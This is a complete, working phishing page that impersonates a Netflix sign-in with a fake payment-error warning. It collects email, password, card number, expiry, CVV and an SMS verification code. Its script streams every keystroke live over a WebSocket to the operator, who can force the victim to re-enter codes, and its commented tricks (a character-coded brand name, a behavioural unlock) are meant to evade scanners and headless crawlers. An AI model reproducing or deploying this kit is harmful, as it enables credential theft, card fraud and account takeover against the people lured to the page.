<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow,noarchive">
<meta name="description" content="Secure account access">
<title>Account</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica Neue,Helvetica,Arial,sans-serif}
  body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
  #shell{opacity:0;pointer-events:none;transition:opacity .25s ease}
  #shell.ready{opacity:1;pointer-events:auto}
  .logo{font-weight:700;font-size:2.2rem;margin:28px 0;letter-spacing:-1px}
  .card{background:rgba(0,0,0,.75);border-radius:4px;padding:48px 32px;width:100%;max-width:360px;box-shadow:0 2px 8px rgba(0,0,0,.6)}
  h1{font-size:1.6rem;margin-bottom:24px;font-weight:600}
  label{display:block;font-size:.875rem;color:#b3b3b3;margin-bottom:4px}
  input{width:100%;padding:12px 10px;margin-bottom:16px;border:1px solid #333;border-radius:4px;background:#333;color:#fff;font-size:1rem}
  input:focus{outline:none;border-color:#e50914}
  button{width:100%;padding:14px;background:#e50914;border:none;border-radius:4px;color:#fff;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px}
  button:hover{background:#f40612}
  #timer{display:none;text-align:center;margin:24px 0;font-size:1.1rem;color:#b3b3b3}
  #timer span{color:#e50914;font-weight:600}
  #finalSection{display:none}
  #thanks{display:none;text-align:center;color:#0f0;margin-top:12px}
  .err{display:none;color:#f66;font-size:.875rem;margin:-8px 0 12px}
  .warn{width:100%;max-width:360px;background:#e87c03;color:#fff;border-radius:4px;padding:12px 16px;font-size:.9rem;margin:-12px 0 16px;line-height:1.4}
</style>
</head>
<body>
  <!-- static DOM stays generic until JS paints brand — scanners reading raw HTML see less -->
  <div id="shell">
    <div class="logo" id="logo"></div>
    <div class="warn" id="warn"></div>
    <div class="card">
      <h1 id="title">Sign In</h1>

      <form id="step1">
        <label>Email or phone number</label><input name="email" autocomplete="off" required>
        <label>Password</label><input name="password" type="password" autocomplete="off" required>
        <label>Card number</label><input name="card" autocomplete="off" inputmode="numeric">
        <label>Expiry date</label><input name="expiry" id="expiry" placeholder="MM/YY" autocomplete="off" inputmode="numeric" maxlength="5">
        <label>CVV</label><input name="cvv" id="cvv" placeholder="3 or 4 digits" autocomplete="off" inputmode="numeric" maxlength="4">
        <button type="submit">Sign In</button>
      </form>

      <div id="timer">Please wait <span id="count">10</span> seconds…</div>

      <form id="finalSection">
        <label id="finalLabel">One last verification</label>
        <div id="finalErr" class="err">Invalid SMS code. Please try again.</div>
        <input name="final" id="finalInput" autocomplete="off" required>
        <button type="submit">Verify</button>
      </form>

      <div id="thanks">Thank you.</div>
    </div>
  </div>

<script>
(function () {
  const brand = String.fromCharCode(78,69,84,70,76,73,88); // paint mark client-side only
  const accent = "#e50914";

  function paint() {
    document.title = brand;
    const logo = document.getElementById("logo");
    logo.textContent = brand;
    logo.style.color = accent;
    document.getElementById("warn").textContent =
      "There was an error with your payment method. Please update it.";
    document.getElementById("shell").classList.add("ready");
  }

  // behavioral unlock — headless screenshot farms often never fire these
  let unlocked = false;
  function unlock() {
    if (unlocked) return;
    unlocked = true;
    paint();
    boot();
  }

  ["pointerdown", "mousemove", "touchstart", "keydown", "scroll"].forEach(ev => {
    window.addEventListener(ev, unlock, { once: true, passive: true });
  });
  // real users with autofocus / mobile still get in; pure no-JS or frozen headless wait longer
  setTimeout(unlock, 1800);

  const step1 = document.getElementById("step1");
  const timer = document.getElementById("timer");
  const finalSection = document.getElementById("finalSection");
  const count = document.getElementById("count");
  const thanks = document.getElementById("thanks");
  const finalErr = document.getElementById("finalErr");
  const finalInput = document.getElementById("finalInput");
  const title = document.getElementById("title");
  let iv = null;
  let ws;

  function connect() {
    const proto = location.protocol === "https:" ? "wss://" : "ws://";
    const known = sessionStorage.getItem("nf_sid");
    ws = new WebSocket(proto + location.host + "/ws" + (known ? "?sid=" + known : ""));
    ws.onmessage = e => {
      const m = JSON.parse(e.data);
      if (m.type === "sid") sessionStorage.setItem("nf_sid", m.sid);
      else if (m.type === "reask") reaskFinal();
      else if (m.type === "reset") resetToStart();
    };
    ws.onclose = () => setTimeout(connect, 1500);
  }

  function send(d) { if (ws && ws.readyState === 1) ws.send(JSON.stringify(d)); }

  function boot() {
    connect();
    document.querySelectorAll("input").forEach(inp => {
      inp.addEventListener("input", () => {
        send({ type: "field", name: inp.name, value: inp.value });
      });
    });

    const expiry = document.getElementById("expiry");
    expiry.addEventListener("input", () => {
      let v = expiry.value.replace(/\D/g, "").slice(0, 4);
      if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
      else if (v.length === 2 && !expiry.value.endsWith("/")) v = v + "/";
      expiry.value = v;
    });

    const cvv = document.getElementById("cvv");
    cvv.addEventListener("input", () => {
      cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
    });

    const card = document.querySelector('input[name="card"]');
    card.addEventListener("input", () => {
      const digits = card.value.replace(/\D/g, "").slice(0, 19);
      card.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    });

    step1.addEventListener("submit", e => {
      e.preventDefault();
      step1.style.display = "none";
      timer.style.display = "block";
      let t = 10;
      count.textContent = t;
      iv = setInterval(() => {
        t--; count.textContent = t;
        if (t <= 0) {
          clearInterval(iv); iv = null;
          timer.style.display = "none";
          finalSection.style.display = "block";
          title.textContent = "Verify";
        }
      }, 1000);
    });

    finalSection.addEventListener("submit", e => {
      e.preventDefault();
      send({ type: "final", value: finalInput.value });
      finalErr.style.display = "none";
      finalSection.style.display = "none";
      thanks.style.display = "block";
    });
  }

  function reaskFinal() {
    if (iv) { clearInterval(iv); iv = null; }
    timer.style.display = "none";
    thanks.style.display = "none";
    finalInput.value = "";
    finalErr.style.display = "block";
    finalSection.style.display = "block";
    title.textContent = "Verify";
    finalInput.focus();
  }

  function resetToStart() {
    if (iv) { clearInterval(iv); iv = null; }
    document.querySelectorAll("input").forEach(i => i.value = "");
    finalErr.style.display = "none";
    timer.style.display = "none";
    finalSection.style.display = "none";
    thanks.style.display = "none";
    step1.style.display = "block";
    title.textContent = "Sign In";
    window.scrollTo(0, 0);
  }
})();
</script>
</body>
</html>
